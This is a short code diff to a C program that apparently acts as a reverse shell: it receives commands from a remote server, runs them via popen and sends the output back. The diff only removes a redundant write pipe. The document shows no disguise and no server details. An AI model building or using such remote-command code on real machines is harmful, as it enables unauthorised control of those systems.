@@ -34,7 +34,6 @@ int main(){
     char serverResponse[256] = {0};
 
     // Open Pipes for Shell
-    FILE * processExec;
     FILE * processRead;
     char clientOutput[256] = {0};
     char fullOutput[256] = {0};
@@ -51,7 +50,6 @@ int main(){
         // If serverResponse is not "exit":
         // Execute commands
         if (serverResponse[0] != 0){
-            processExec = popen(serverResponse,"w");
             processRead = popen(serverResponse,"r");
             
             // Concatenate the output and send to the server
@@ -66,7 +64,6 @@ int main(){
 
     // Cleanup
     close(networkSocket);
-    pclose(processExec);
     pclose(processRead);
 
     return 0;
